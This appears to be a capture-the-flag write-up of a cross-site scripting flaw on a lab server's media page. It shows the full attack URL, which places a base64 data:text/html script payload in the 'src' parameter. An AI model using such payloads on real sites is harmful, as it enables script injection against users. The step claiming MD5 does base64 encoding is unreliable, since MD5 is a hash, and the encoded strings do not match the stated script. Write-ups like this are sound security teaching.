# 07-XSS2_NSA_Image

AT the adress bar a GET request is done for the NSA image.
the request text/html is an accepted format aswell.
we can inject some HTML there

## The approach

- Go to http://192.168.42.238/  

- Scroll down and click the NSA image

- Use MD5 to Encode this script <script>alert('hello world')</script> in base64

- This will return `PHNjcmlwdD5hbGVydCgiaGVsbG8gd29ybGQiKTwvc2NyaXB0Pg==`

- Append this result and replace the NSA get request in the URL bar

final result will be : http://192.168.42.238/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnVGhpcyB3b3JrcycpPC9zY3JpcHQ+


## The Exploit #

Users we can inject some HTML on the website

## The solution

Validate user inputs on all fields.
